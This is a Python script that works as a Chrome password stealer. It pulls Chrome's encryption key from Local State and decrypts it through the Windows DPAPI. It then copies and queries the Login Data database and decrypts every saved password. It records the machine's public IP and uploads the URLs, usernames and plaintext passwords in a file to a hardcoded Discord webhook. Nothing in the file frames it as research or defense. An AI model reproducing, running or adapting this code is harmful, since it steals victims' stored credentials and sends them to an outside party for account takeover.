import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import win32crypt
import time
import shutil
import requests

def get_ip_info():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            ip_info = response.json()
            return ip_info
        else:
            print("Failed to retrieve IP information.")
            return None
    except Exception as e:
        print(f"Error retrieving IP information: {e}")
        return None

def send_to_discord(file_path):
    webhook_url = 'https://discord.com/api/webhooks/1242194300838613012/VdP9q1fwTq_-n95AUMhoToMCvASepg1ILhLM9X4GgADYsNG1uKkV_lxYVTZD8X7sx4sO'
    try:
        with open(file_path, 'rb') as file:
            payload = {'file': file}
            response = requests.post(webhook_url, files=payload)
            if response.status_code == 200:
                print("File sent to Discord successfully.")
            else:
                print("Failed to send file to Discord.")
                print(f"Response content: {response.content.decode()}")
    except Exception as e:
        print(f"Error sending file to Discord: {e}")

def get_chrome_decryption_key():
    local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
    
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state_data = json.load(f)
            encrypted_key_b64 = local_state_data['os_crypt']['encrypted_key']
            encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove the DPAPI prefix
            decryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decryption_key
    except Exception as e:
        print(f"Error retrieving Chrome decryption key: {e}")
        return None

def decrypt_password(ciphertext, key):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()  # Remove the GCM tag
        return decrypted_pass
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return None

def get_chrome_passwords():
    passwords = []
    chrome_user_data_path = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
    login_data_path = os.path.join(chrome_user_data_path, 'Login Data')

    retry_count = 5  # Increase the number of retries
    retry_delay = 2  # Increase the delay between retries to 2 seconds

    for retry in range(retry_count):
        try:
            decryption_key = get_chrome_decryption_key()
            if not decryption_key:
                print("Failed to retrieve decryption key.")
                return passwords

            # Create a copy of the database file
            login_data_copy_path = os.path.join(os.getenv('TEMP'), 'LoginDataCopy.db')
            shutil.copy2(login_data_path, login_data_copy_path)

            # Attempt to open the copy of the database file
            with sqlite3.connect(login_data_copy_path) as connection:
                cursor = connection.cursor()
                cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    url, username_value, password_value = row
                    try:
                        password = decrypt_password(password_value, decryption_key)
                        if password:
                            passwords.append({
                                'url': url,
                                'username': username_value,
                                'password': password
                            })
                    except Exception as e:
                        print(f"Error decoding password for URL '{url}': {e}")
                return passwords  # Return passwords if successfully retrieved
        except sqlite3.OperationalError as e:
            print(f"Error retrieving Chrome passwords: {e}")
            if retry < retry_count - 1:
                print("Retrying...")
                time.sleep(retry_delay)  # Wait before retrying
    return passwords  # Return empty list if retries fail

if __name__ == '__main__':
    try:
        ip_info = get_ip_info()
        if ip_info:
            machine_ip = ip_info.get('ip')
            content = f"IP Address: {machine_ip}\n\n"
            passwords = get_chrome_passwords()
            if passwords:
                content += "Chrome passwords found:\n"
                for password in passwords:
                    content += f"URL: {password['url']}\n"
                    content += f"Username: {password['username']}\n"
                    content += f"Password: {password['password']}\n\n"
            else:
                content += "No Chrome passwords found."
            file_path = os.path.join(os.getenv('TEMP'), 'chrome_passwords.txt')
            with open(file_path, 'w') as file:
                file.write(content)
            send_to_discord(file_path)
        else:
            print("Failed to retrieve IP information. Skipping sending to Discord.")
    except Exception as e:
        print(f"An error occurred: {e}")
